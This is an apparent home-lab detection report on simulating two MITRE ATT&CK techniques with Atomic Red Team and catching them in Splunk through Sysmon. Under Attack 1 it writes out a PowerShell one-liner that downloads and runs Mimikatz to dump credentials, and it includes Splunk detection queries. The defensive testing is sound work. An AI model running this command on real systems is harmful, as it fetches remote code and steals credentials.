# Attack Simulation Report — Atomic Red Team

**Date:** 16–17 June 2026

**Environment:** Windows 11 Home Lab — JBs_DESKTOP26

**Detection Platform:** Splunk Enterprise

**Framework:** MITRE ATT&CK via Invoke-AtomicRedTeam

---

## Attack 1 — T1059.001 — Command and Scripting Interpreter: PowerShell

**Tactic:** Execution

**Technique:** T1059.001

**Tool Used:** Invoke-AtomicRedTeam — Test 1 (Mimikatz via PowerShell)

**What was simulated:**
Adversary used PowerShell to download and execute Mimikatz — a credential dumping tool, to extract password hashes from Windows memory using sekurlsa::logonpasswords.

**Attack Command Executed:**
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerMimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

**Detection Result:** DETECTED

**Detection Method:** Sysmon EventCode 1 captured PowerShell execution with malicious CommandLine arguments including credential dumping commands.

**Splunk Query Used:**
index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
host="JBs_DESKTOP26" EventCode=1
| where match(Image, "(?i)powershell\.exe") AND NOT match(Image, "(?i)splunk")
| table _time, User, Image, CommandLine, ParentImage
| sort -_time

**Outcome:**
Mimikatz executed successfully but failed to dump credentials due to Windows LSA protection blocking memory access (ERROR kuhl_m_sekurlsa_acquireLSA). Sysmon captured the full attack chain. Detection confirmed via Splunk query and Process Creation Dashboard Panel 1 timeline spike.

**Evidence:**
- attack1_powershell_sysmon_detection.png
- attack1_process_timeline_spike.png
- attack1_parentchild_panel.png

---

## Attack 2 — T1082 — System Information Discovery

**Tactic:** Discovery

**Technique:** T1082

**Tool Used:** Invoke-AtomicRedTeam — Test 1

**What was simulated:**
Adversary executed system reconnaissance commands immediately after gaining access to enumerate the target environment including OS version, hardware details, network configuration, installed hotfixes, and disk information.

**Commands Executed by Attack:**
- systeminfo
- hostname
- ipconfig

**Detection Result:** DETECTED

**Detection Method:** Sysmon EventCode 1 captured all reconnaissance executions with full CommandLine arguments. Commands appeared in both targeted SPL detection query and Process Creation Dashboard Panel 4 Rare Process Execution.

**Splunk Query Used:**
index=sysmon source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" 
host="JBs_DESKTOP26" EventCode=1
| where match(CommandLine, "(?i)(systeminfo|whoami|ipconfig|hostname|reg query|wmic)")
| table _time, User, Image, CommandLine, ParentImage
| sort -_time

**Outcome:**
All reconnaissance commands captured in real time by Sysmon. Systeminfo and whoami.exe appeared in Panel 4 Rare Process Execution confirming low-frequency execution detection logic works correctly. Process burst visible in Panel 1 timeline at exact attack timestamp.

**Evidence:**
- attack2_recon_commands_detected.png
- attack2_dashboard_panel1_spike.png
- attack2_dashboard_panel4_rare.png

---

## Summary

| Attack | Technique | Tactic | Result |
|--------|-----------|--------|--------|
| Mimikatz via PowerShell | T1059.001 | Execution | Detected |
| System Information Discovery | T1082 | Discovery | Detected |

**Key Finding:**
Both attacks were successfully detected using Sysmon process creation logs forwarded to Splunk. Detection rules based on CommandLine pattern matching and process frequency analysis proved effective against real MITRE ATT&CK techniques.

**Defensive Note:**
Windows LSA protection successfully blocked credential extraction during Attack 1 demonstrating defence-in-depth — even when detection fails, system hardening can prevent impact.
